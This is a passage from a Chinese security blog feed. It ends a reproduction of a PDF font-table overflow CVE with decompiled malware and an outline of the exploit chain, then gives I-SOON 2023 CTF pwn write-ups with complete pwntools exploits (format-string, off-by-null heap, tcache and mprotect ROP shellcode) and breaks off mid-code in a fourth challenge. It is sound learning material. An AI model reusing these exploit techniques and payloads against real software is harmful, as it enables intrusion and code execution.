Buffer[257]; // [esp+18h] [ebp-618h] BYREF  __int16 v6; // [esp+119h] [ebp-517h]  char v7; // [esp+11Bh] [ebp-515h]  CHAR Filename[257]; // [esp+120h] [ebp-510h] BYREF  __int16 v9; // [esp+221h] [ebp-40Fh]  char v10; // [esp+223h] [ebp-40Dh]  CHAR v11[1021]; // [esp+228h] [ebp-408h] BYREF  __int16 v12; // [esp+625h] [ebp-Bh]  char v13; // [esp+627h] [ebp-9h]  memset(Buffer, 0, sizeof(Buffer));  v6 = 0;  v7 = 0;  GetTempPathA(0x104u, Buffer);  v1 = (char *)&amp;NumberOfBytesWritten + 3;  while ( *++v1 )    ;  strcpy(v1, &quot;_unstop.bat&quot;);  memset(Filename, 0, sizeof(Filename));  v9 = 0;  v10 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  FileA = CreateFileA(Buffer, 0xC0000000, 1u, 0, 2u, 0x10000080u, 0);  if ( FileA != (HANDLE)-1 )  &#123;    memset(v11, 0, sizeof(v11));    v12 = 0;    v13 = 0;    wsprintfA(v11, &quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;, a1, a1, Buffer);    NumberOfBytesWritten = 0;    WriteFile(FileA, v11, strlen(v11), &amp;NumberOfBytesWritten, 0);    CloseHandle(FileA);    ShellExecuteA(0, &quot;open&quot;, Buffer, 0, 0, 0);    Sleep(0x1388u);  &#125;&#125;</code></pre><p>之后我就不细讲了，这里涉及到的知识越来越难懂了，写了没什么意义，总的来说就是，svrhost.exe文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后他也会创建一系列bat批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意DLL，而该注入的恶意DLL文件就是msxml0r.dll文件.</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"></p><p>他经过PECompact加壳处理，他会得到3个URL地址然后不断发送HTTP请求，下载3个gif文件，可以猜测这三个gif文件中包含一些PE数据，用来执行恶意操作。最后我们的shellcode将会把PDF样本修改为正常文件，也就是删除了TTF字体的SING表。</p><p>可以看到PDF正常打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"></p><p>整个恶意PDF文件如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939012efb90f43eec54e737d1967a.jpg"></p><h2 id="8-整体过程"><a href="#8-整体过程" class="headerlink" title="8.整体过程"></a>8.整体过程</h2><p>不得不说自身还是太菜了，在后面恶意代码分析阶段差的不是一点半点，但好歹也把漏洞利用这部分搞明白了，总体流程归结于如下几点：</p><ol><li>strcat函数可以通过SING表的uniqueName字段来进行栈溢出</li><li>通过覆盖栈上的函数指针而不是返回值，使得后续调用该指针来绕过GS，也就是canary，然后进行ROP</li><li>使用heap spray来布置大量相同的shellcode。堆喷的脚本使用随机变量名、\x25替代%号来、添加无用代码来绕过杀毒软件分析</li><li>通过ROP来绕过DEP保护，也就是NX</li><li>其中ROP的构造我们利用未开启ALSR的模块来获取gadget，他的地址一般是固定的</li><li>由于我们的uniqueName可能不能太大，防止覆盖程序关键数据，因此我们此时使用两次栈迁移来到我们精准堆喷的地址，0x0c0c0c0c，我们将漏洞利用程序使用文件映射的一些函数映射到内存，然后将EIP指向他。</li><li>然后我们通过PEB环境控制块来获取kernel32.dll的基地址，从而获取一些需要运行的函数地址</li><li>通过异或和交换字符来对恶意PE文件进行加密</li><li>释放并且运行svchost.exe恶意文件，文件名同系统进程名一致，增加隐蔽性</li><li>提升权限，关闭系统文件保护，用来修改系统文件</li><li>修改打印服务程序spoolsv.exe的导入表，使得其在启动的时候加载恶意dll程序</li><li>修改文件时间等加密隐蔽性，然后运行完程序后，会删除没用的程序防止被发现</li><li>利用加壳防止逆向分析</li><li>远程下载恶意程序，最后修改恶意样本PDF文件为正常PDF并打开，假装我们是正常开启。</li></ol><h2 id="9-漏洞修复"><a href="#9-漏洞修复" class="headerlink" title="9.漏洞修复"></a>9.漏洞修复</h2><p>官方在之后修补该漏洞的时候，添加了字符串长度的检测和限制，用新的函数来替代了strcat函数，这样就避免了我们在栈上构造虚假函数指针</p><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h2><p>不得不说自己掌握的知识还是太少，上面整体过程中步骤从1~6是漏洞利用步骤看着还挺顺利，之后的步骤是恶意代码行为，对于恶意文件分析感觉自己对windows了解的太少了，之后还是先复现linux的漏洞再来看windows把。不过由于这是本人第一次进行漏洞复现，所以对于恶意代码也尽量硬着头皮看了看，但是发现自身对于windows的了解还是太少，看到后面还是挺折磨的，因此我下一步准备还是复现Linux方面的了。</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Windows</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I-SOON_2023</title>
    <link href="/2023/06/17/I-SOON-2023(pwn)/"/>
    <url>/2023/06/17/I-SOON-2023(pwn)/</url>
    
    <content type="html"><![CDATA[<h2 id="1-I-SOON-2023-harde-pwn"><a href="#1-I-SOON-2023-harde-pwn" class="headerlink" title="1. [I-SOON 2023]harde_pwn"></a>1. [I-SOON 2023]harde_pwn</h2><p>首先是检查题目情况</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/harde_pwn$ checksec pwn          [*] &#39;/home/dawn/Downloads/harde_pwn/pwn&#39;                                   Arch:     amd64-64-little                                              RELRO:    Full RELRO                                                   Stack:    No canary found                                              NX:       NX enabled                                                   PIE:      PIE enabled                                                  RUNPATH:  b&#39;../../tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/&#39;</code></pre><p>其中libc已经给出为2.35，第一反应是找IO利用链，但是这里我发现我自己是想太多了，如果题目给出栈情况，且版本较高，那就应该单利用栈就行了？何况还是pwn1。<br>虽说是pwn1但是还是没写出来，有个非栈上的格式化漏洞但就是不知道写哪儿。</p><p>首先分析反编译代码</p><pre><code class="hljs">_DWORD *fuxk_game()&#123;  _DWORD *result; // rax  char buf[28]; // [rsp+0h] [rbp-40h] BYREF  __int64 seed; // [rsp+1Ch] [rbp-24h]  int v3; // [rsp+24h] [rbp-1Ch] BYREF  int v4; // [rsp+28h] [rbp-18h]  int i; // [rsp+2Ch] [rbp-14h]  puts(&quot;Welcome to a ctype game!&quot;);  seed = randomm();  read(0, buf, 0x20uLL);  srand(seed);  for ( i = 0; i &lt;= 20; ++i )  &#123;    v4 = (rand() ^ 0x24) + 1;    puts(&quot;input: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v3);    if ( v4 != v3 )    &#123;      puts(&quot;fuxk up!&quot;);      exit(1);    &#125;    puts(&quot;Success!&quot;);  &#125;  result = &amp;is_fmt;  is_fmt = 1;  return result;&#125;</code></pre><p>这里发现首先得过一下上面这个game，可以知道seed是由<code>/dev/urandom</code>而来，所以无法使用ctypes，但是我们发现后面有个buf溢出，可以覆盖到seed，所以我们覆盖为0再写一个简单的c就可以得出连续20个随机数，但这里其实可以用ctypes库了。</p><p>过了上面的函数之后就会有一个堆上的格式化字符串</p><pre><code class="hljs">void __noreturn heap_fmt()&#123;  char *ptr; // [rsp+8h] [rbp-8h]  for ( ptr = 0LL; ; printf(ptr) )  &#123;    ptr = (char *)realloc(ptr, 0x1000uLL);    my_write(&quot;input your data ;)\n&quot;);    read(0, ptr, 0x1000uLL);  &#125;&#125;</code></pre><p>这里我们发现无法跳出函数，且结束不了主函数，因此无法来通过格式化字符串来写返回值，比赛中我甚至想在栈上写一个堆地址，然后每次修改ptr值为0，导致realloc每次新分配一个0x1000的大块，最终打爆topchunk，再触发一下<code>malloc_assert</code>来使用house of cat,但最终还是没有实现。之后看师傅们的wp发现自己想太多了</p><p>得出结论在比赛中重要的还是<strong>调试</strong></p><p>回到题目中，既然无法达到调用printf的函数ret，那就修改printf的返回值就行，如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────                         0x7f51addb181a &lt;printf+170&gt;     call   0x7f51addc60b0                &lt;0x7f51addc60b0&gt;                                                                                                                         0x7f51addb181f &lt;printf+175&gt;     mov    rdx, qword ptr [rsp + 0x18]                                     0x7f51addb1824 &lt;printf+180&gt;     sub    rdx, qword ptr fs:[0x28]                                        0x7f51addb182d &lt;printf+189&gt;     jne    printf+199                &lt;printf+199&gt;                                                                                                                                 0x7f51addb182f &lt;printf+191&gt;     add    rsp, 0xd8                                                     ► 0x7f51addb1836 &lt;printf+198&gt;     ret                                  &lt;0x556c83a69500; heap_fmt+92&gt;      ↓                                                                                                     0x556c83a69500 &lt;heap_fmt+92&gt;    jmp    heap_fmt+20                &lt;heap_fmt+20&gt;                         ↓                                                                                                     0x556c83a694b8 &lt;heap_fmt+20&gt;    mov    rax, qword ptr [rbp - 8]                                        0x556c83a694bc &lt;heap_fmt+24&gt;    mov    esi, 0x1000                                                     0x556c83a694c1 &lt;heap_fmt+29&gt;    mov    rdi, rax                                                        0x556c83a694c4 &lt;heap_fmt+32&gt;    call   realloc@plt                &lt;realloc@plt&gt;                     ────────────────────────────────────[ STACK ]────────────────────────────────────                      00:0000│ rsp 0x7ffe1c865e48 —▸ 0x556c83a69500 (heap_fmt+92) ◂— jmp    0x556c83a694b8                   01:0008│     0x7ffe1c865e50 ◂— 0x0                                                                     02:0010│     0x7ffe1c865e58 —▸ 0x556c845532a0 ◂— &#39;%24160c%15$hn&#39;                                       03:0018│ rbp 0x7ffe1c865e60 —▸ 0x7ffe1c865e70 ◂— 0x1                                                   04:0020│     0x7ffe1c865e68 —▸ 0x556c83a69543 (main+65) ◂— mov    eax, 0                               05:0028│     0x7ffe1c865e70 ◂— 0x1                                                                     06:0030│     0x7ffe1c865e78 —▸ 0x7f51add7ad90 ◂— mov    edi, eax                                       07:0038│     0x7ffe1c865e80 ◂— 0x0                                                                     </code></pre><p>可以看到这里printf准备返回了已经，此时rsp上面就写着返回的地址，并且此时这里我们并没有动到rbp，所以我们可以写rsp的值为我们的一个特殊的指令，比如说就是我们的某个指令，然后再跟下面rbp进行配合即可，因此我们选用ret2rcu上的一段指令，</p><pre><code class="hljs">pwndbg&gt; x/20i 0x5582df56d5b0                           0x5582df56d5b0 &lt;__libc_csu_init+96&gt;: pop    r14     0x5582df56d5b2 &lt;__libc_csu_init+98&gt;: pop    r15     0x5582df56d5b4 &lt;__libc_csu_init+100&gt;:        ret </code></pre><p>我们看到这里的指令真是妙到极点，我们通过ret到该指令这里，然后连续pop两个值，再调用ret就会弹出我们rbp的值，然后就可以执行我们写入rbp的one_gadget了，情况如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────                                           0x7f02c954b81a &lt;printf+170&gt;             call   0x7f02c95600b0                &lt;0x7f02c95600b0&gt;                                                                                                                                                   0x7f02c954b81f &lt;printf+175&gt;             mov    rdx, qword ptr [rsp + 0x18]                                              0x7f02c954b824 &lt;printf+180&gt;             sub    rdx, qword ptr fs:[0x28]                                                 0x7f02c954b82d &lt;printf+189&gt;             jne    printf+199                &lt;printf+199&gt;                                                                                                                                                           0x7f02c954b82f &lt;printf+191&gt;             add    rsp, 0xd8                                                              ► 0x7f02c954b836 &lt;printf+198&gt;             ret                                  &lt;0x55711d89d5b0; __libc_csu_init+96&gt;        ↓                                                                                                                      0x55711d89d5b0 &lt;__libc_csu_init+96&gt;     pop    r14                                                                      0x55711d89d5b2 &lt;__libc_csu_init+98&gt;     pop    r15                                                                      0x55711d89d5b4 &lt;__libc_csu_init+100&gt;    ret                                                                              ↓                                                                                                                      0x7f02c95d6cf5 &lt;execvpe+1141&gt;           mov    rsi, r10                                                                 0x7f02c95d6cf8 &lt;execvpe+1144&gt;           lea    rdi, [rip + 0xec999]                                                  ───────────────────────────────────[ STACK ]────────────────────────────────────                                        00:0000│ rsp 0x7ffcfb0d93c8 —▸ 0x55711d89d5b0 (__libc_csu_init+96) ◂— pop    r14                                        01:0008│     0x7ffcfb0d93d0 ◂— 0x0                                                                                      02:0010│     0x7ffcfb0d93d8 —▸ 0x55711ed972a0 ◂— &#39;%176c%45$hhn&#39;                                                         03:0018│ rbp 0x7ffcfb0d93e0 —▸ 0x7f02c95d6cf5 (execvpe+1141) ◂— mov    rsi, r10                                         04:0020│     0x7ffcfb0d93e8 —▸ 0x55711d89d543 (main+65) ◂— mov    eax, 0                                                05:0028│     0x7ffcfb0d93f0 ◂— 0x1                                                                                      06:0030│     0x7ffcfb0d93f8 —▸ 0x7f02c9514d90 ◂— mov    edi, eax                                                        07:0038│     0x7ffcfb0d9400 ◂— 0x0                                                                                      </code></pre><p>至于任意地址写，是我们通过栈上存在的一个<code>栈地址-&gt;栈地址-&gt;栈地址</code>链条来达成，具体手法可以自行搜索<br>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sa(&quot;game!\n&quot;, b&#39;\x00&#39;*32)sla(&quot;input: \n&quot;, str(0x6b8b4544))sla(&quot;input: \n&quot;, str(0x327b23e3))sla(&quot;input: \n&quot;, str(0x643c984e))sla(&quot;input: \n&quot;, str(0x66334858))sla(&quot;input: \n&quot;, str(0x74b0dc76))sla(&quot;input: \n&quot;, str(0x19495cdc))sla(&quot;input: \n&quot;, str(0x2ae8946f))sla(&quot;input: \n&quot;, str(0x625558c9))sla(&quot;input: \n&quot;, str(0x238e1f0e))sla(&quot;input: \n&quot;, str(0x46e87cea))sla(&quot;input: \n&quot;, str(0x3d1b589f))sla(&quot;input: \n&quot;, str(0x507ed790))sla(&quot;input: \n&quot;, str(0x2eb141d7))sla(&quot;input: \n&quot;, str(0x41b71ee0))sla(&quot;input: \n&quot;, str(0x79e2a9c8))sla(&quot;input: \n&quot;, str(0x7545e163))sla(&quot;input: \n&quot;, str(0x515f0059))sla(&quot;input: \n&quot;, str(0x5bd062e7))sla(&quot;input: \n&quot;, str(0x12200871))sla(&quot;input: \n&quot;, str(0x4db127dd))sla(&quot;input: \n&quot;, str(0x2162340))elf = ELF(&#39;./pwn&#39;)libc = ELF(&#39;./libc.so.6&#39;)sla(&quot;data ;)\n&quot;, b&#39;%11$p%9$p%8$p&#39;)ru(&#39;0x&#39;)libc_base = int(rc(12), 16) - 0x29d90ru(&#39;0x&#39;)pro_base = int(rc(12), 16) - 0x1543ru(&#39;0x&#39;)stack_addr = int(rc(12), 16) - 0x28slog(&quot;stack_addr&quot;, stack_addr)slog(&quot;libc_base&quot;, libc_base)slog(&quot;pro_base&quot;, pro_base)stack_low2 = int(stack_addr%0x10000)print(stack_low2)rbp = stack_addr + 0x18rbp_low2 = int(rbp%0x10000)#change the rbpone_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]shell = libc_base + one_gadget[2]shell_low2 = shell%0x10000shell_mid2 = int(shell/0x10000)%0x10000shell_high2 = int(shell/0x100000000)slog(&quot;shell&quot;, shell)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_low2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_mid2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 4) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_high2) + &#39;c%45$hn\x00&#39;)#change the retsla(&quot;data ;)\n&quot;, &#39;%&#39;+str(stack_low2) + &#39;c%15$hn\x00&#39;)debug()sla(&quot;data ;)\n&quot;, &#39;%176c%45$hhn\x00&#39;)io.interactive()</code></pre><h2 id="2-I-SOON-2023-pwnpwn"><a href="#2-I-SOON-2023-pwnpwn" class="headerlink" title="2. [I-SOON 2023]pwnpwn"></a>2. [I-SOON 2023]pwnpwn</h2><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwnpwn$ checksec pwn[*] &#39;/home/dawn/Downloads/pwnpwn/pwn&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>题目环境2.31,保护全开<br>本题十分的可惜，应该是可以出的，感觉是pwn1一直没想到所以心态有点问题，导致本题看的时候居然off by null没看到，这也说明了比赛中心境也是一个重要点，本题十分常规，最开始ida会有一些混淆，例如：</p><pre><code class="hljs">  sub_B20();  puts(&quot;Welcome to An Xun Cup, this is an menu&quot;);  check();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add();        break;      case 2:        if ( dword_203024 &lt; 10 || (((dword_203098 - 1) * dword_203098) &amp; 1) == 0 )          goto LABEL_5;        do        &#123;          show();LABEL_5:          show();        &#125;        while ( dword_203024 &gt;= 10 &amp;&amp; (((dword_203098 - 1) * dword_203098) &amp; 1) != 0 );        break;</code></pre><p>慢慢逆会发现这些语句就是一些重复的，不用管他们，整个题首先需要ctypes进行模拟，出几个随机数的个位来猜组合的千位数，然后这里面show和edit&#x2F;delete功能不能同时使用，需要运行权限切换的一个函数来切换状态，其他就十分常规，add函数里面由off by null（我朝，太sb了我）。</p><p>然后之后就是制造重叠堆块，向上合并，这里记住恢复一下堆块们的布局，之后就是重叠堆块中写以释放堆块tcachebins的fd指针了，很常规，写free hook，</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(index, size, content):    sla(&quot;root@$\n&quot;, str(1))    sla(&quot;index:\n&quot;, str(index))    sla(&quot;size:\n&quot;, str(size))    sa(&quot;content:\n&quot;, content)def show(index):    sla(&quot;root@$\n&quot;, str(2))    sla(&quot;index:\n&quot;, str(index))def edit(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def edit_0(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def delete(index):    sla(&quot;root@$\n&quot;, str(4))    sla(&quot;index:\n&quot;, str(index))def login(passwd):    sla(&quot;root@$\n&quot;, str(5))    sla(&quot;username\n&quot;, &#39;fang&#39;)    sla(&quot;passwd\n&quot;, passwd) LIBC = cdll.LoadLibrary(&#39;./libc-2.31.so&#39;)LIBC.srand(LIBC.time(0))libc = ELF(&#39;./libc-2.31.so&#39;)qian = LIBC.rand()%10bai = LIBC.rand()%10shi = LIBC.rand()%10ge = LIBC.rand()%10num = qian*1000 + bai*100 + shi*10 + gesla(&quot;number:&quot;, str(num))add(0, 0x410,  b&#39;aaaaa&#39;)add(1, 0x20, b&#39;ccc&#39;)login(&#39;abcd&#39;)   # show-&gt;edits(&#39;\n&#39;)edit(0, b&#39;cbdfasaf&#39;)delete(0)add(0, 0x410, b&#39;a&#39;*7)edit(0, b&#39;a&#39;*8)debug()login(&#39;a&#39;*8)   # edit-&gt;showshow(0)libc_base = get_address() - 0x1ecbe0slog(&quot;libc_base&quot;, libc_base)malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]slog(&quot;__malloc_hook&quot;, malloc_hook)free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]slog(&quot;__free_hook&quot;, free_hook)system = libc_base + libc.sym[&#39;system&#39;]# leak the heaplogin(b&#39;a&#39;*3 + b&#39;\x00&#39;) #show-&gt;editadd(2, 0x20, b&#39;fdasf&#39;)add(3, 0x4f0, b&#39;aaaa&#39;)add(4, 0x10, b&#39;aaaa&#39;)add(5, 0x20, b&#39;aaaa&#39;)delete(0)add(6, 0x500, b&#39;cccc&#39;)add(0, 0x410, b&#39;aaaa&#39;)edit(0, b&#39;a&#39;*0xf + b&#39;c&#39;) login(b&#39;a&#39;*8) #edit-&gt;showshow(0)ru(&#39;ac&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;heap_base&quot;, heap_base)login(b&#39;aaa\x00&#39;)delete(2)add(2, 0x28, p64(heap_base + 0x6c0) + b&#39;a&#39;*0x18 + p64(0x50))delete(1)add(1, 0x20, p64(0)+p64(0x51) + p64(heap_base + 0x6f0 - 0x18) + p64(heap_base + 0x6f0 - 0x10))   #pass the unlink checkdelete(3)       #overlap backwardadd(3, 0x100, p64(0)*3 + p64(0x31))    #resolve the heapdelete(5)delete(2)delete(3)add(3, 0x100, p64(0)*3 + p64(0x31) + p64(free_hook))add(2, 0x20, b&#39;ccc&#39;)add(5, 0x20, p64(system))add(7, 0x20, b&#39;/bin/sh\x00&#39;)delete(7)io.interactive()</code></pre><h2 id="3-I-SOON-2023-DE-CAT"><a href="#3-I-SOON-2023-DE-CAT" class="headerlink" title="3.[I-SOON 2023] DE-CAT"></a>3.[I-SOON 2023] DE-CAT</h2><p>照常检查，</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ checksec pwn [*] &#39;/home/dawn/Downloads/pwn/toCTFer/pwn&#39;                          Arch:     amd64-64-little                                       RELRO:    Full RELRO                                            Stack:    Canary found                                          NX:       NX enabled                                            PIE:      PIE enabled                                           RUNPATH:  b&#39;./&#39;                                             </code></pre><p>保护全开以及版本为2.35</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ seccomp-tools dump ./pwn  line  CODE  JT   JF      K                                                 =================================                                            0000: 0x20 0x00 0x00 0x00000004  A = arch                                   0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004            0002: 0x20 0x00 0x00 0x00000000  A = sys_number                             0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                 0004: 0x06 0x00 0x00 0x00000000  return KILL                                0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                              </code></pre><p>存在沙盒，禁止了execve，所以基本上可以确定使用orw</p><p>题目的漏洞为edit函数当中的off by null</p><pre><code class="hljs">  result = (*(&amp;chunk_list + v1) + read(0, *(&amp;chunk_list + v1), size_list[v1]));  *result = 0;</code></pre><p>因此本题依然是采用overlapp来解题，首先是制造重叠堆块，然后修改tcache，这里因为我们需要多次分配奇奇怪怪的堆块，所以我们先控制tcache struct的0x290堆块来任意分配堆块。</p><p>控制了tcache struct后我们就可以通过environ来获取栈地址，然后我们修改add的ret地址来制造ROP，这里我们调用mprotect函数来将我们的栈地址增加一个执行权限，然后再到上面布置shellcode即可orw</p><p>exp如下：</p><pre><code class="hljs">from pwn import * from LibcSearcher import* context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;59.110.164.72&#39;, 10066) #io = remote(&quot;node4.buuoj.cn&quot;, 26610)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;31m[+]\033[40;35m&quot;+ name + &quot;==&gt;&quot; + hex(address) + &quot;\033[0m&quot;)def debug(): gdb.attach(io)def get_address(): return u64(ru(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(size, content):    #0x2d    sla(b&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    sla(b&quot;size:\n&quot;,str(size))    sa(b&#39;content:\n&#39;, content)def delete(index):    sla(b&#39;&gt;&gt; \n&#39;, &#39;2&#39;)    sla(&quot;idx:\n&quot;, str(index))def show(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;3&#39;)    sla(b&#39;idx:\n&#39;, str(index))def edit(index, content):    sla(b&quot;&gt;&gt; \n&quot;, &#39;4&#39;)    sla(b&#39;idx:\n&#39;, str(index))    sa(b&#39;content:\n&#39;, content)def kill(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;5&#39;)    sla(b&#39;---&gt;\n&#39;, str(index))add(0x4f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39;aaaa&#39;)  #1delete(0)add(0x5f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39; &#39;) #2show(2)ru(&#39;\x00\x00&#39;)libc_base = get_address()- 0x21a110ru(&#39;\x00\x00&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;libc_base&quot;, libc_base)slog(&quot;heap_base&quot;, heap_base)edit(2, flat(&#123;0x0:heap_base + 0x290, 0x8:heap_base + 0x290, 0x4f0:0x500&#125;, filler = b&#39;\x00&#39;, length = 0x4f8))libc = ELF(&#39;./libc.so.6&#39;)mprotect = libc_base + libc.sym[&#39;mprotect&#39;]slog(&quot;mprotect&quot;, mprotect)delete(1) #overlap backwardadd(0x288, b&#39;aa&#39;) #1add(0x288, b&#39;a&#39;) #3delete(3)delete(2)edit(1, p64(((heap_base + 0x2a0)&gt;&gt;12)^(heap_base + 0x10))) #alloc the tcache structadd(0x288, b&#39;aa&#39;) #2add(0x288, flat(&#123;0x30:0x1, 0x140:libc_base + 0x221200 - 0x10&#125;, filler = b&#39;\x00&#39;, length = 0x288)) #3 , environadd(0x198, b&#39;a&#39;*0x10) #4show(4)stack_addr = get_address()slog(&quot;stack&quot;, stack_addr)debug()add_ret = stack_addr - 0x140pop_rdi = libc_base + 0x000000000002a3e5pop_rsi = libc_base + 0x000000000002be51pop_rdx_r12 = libc_base + 0x000000000011f497jmp_rsp = libc_base + 0x8821dedit(3, flat(&#123;0x30:0x1, 0x140:add_ret - 0x8&#125;, filler = b&#39;\x00&#39;))slog(&quot;add_ret&quot;, add_ret)payload = p64(0) + p64(pop_rdi) + p64(stack_addr&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect)payload += p64(jmp_rsp)shellcode = shellcraft.open(&#39;./flag&#39;, 0)shellcode += shellcraft.read(&#39;rax&#39;, heap_base + 0xca0, 0x30)shellcode += shellcraft.write(1, heap_base + 0xca0, 0x30)shellcode = asm(shellcode)payload += shellcode + b&#39;aaaa&#39;add(0x198, payload)io.interactive()</code></pre><h2 id="4-I-SOON-2023-computer"><a href="#4-I-SOON-2023-computer" class="headerlink" title="4.[I-SOON 2023]computer"></a>4.[I-SOON 2023]computer</h2><p>本题突一个字“逆”，题目中冗杂的数据结构以及分配手法令人眼花缭乱。此时仅需要一颗平静的心态和良好的环境（以及星盟的wp呜呜呜）。</p><p>据说computer团长一个半小时就出了，tql。</p><p>先检查一下，不过多半也是全开</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ checksec computer        [*] &#39;/home/dawn/Downloads/pwn/computer/computer&#39;                                 Arch:     amd64-64-little                                                    RELRO:    Full RELRO                                                         Stack:    Canary found                                                       NX:       NX enabled                                                         PIE:      PIE enabled                                                        RUNPATH:  b&#39;../../../tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/&#39; </code></pre><p>其中也存在沙盒，因此是采用orw</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ seccomp-tools dump ./computer     line  CODE  JT   JF      K                                                          =================================                                                     0000: 0x20 0x00 0x00 0x00000004  A = arch                                            0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004                     0002: 0x20 0x00 0x00 0x00000000  A = sys_number                                      0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                          0004: 0x06 0x00 0x00 0x00030000  return TRAP                                         0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                                       </code></pre><p>然后就是本题最为关键的逆向环节</p><pre><code class="hljs">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char s[2568]; // [rsp+10h] [rbp-A10h] BYREF  unsigned __int64 v4; // [rsp+A18h] [rbp-8h]  v4 = __readfsqword(0x28u);  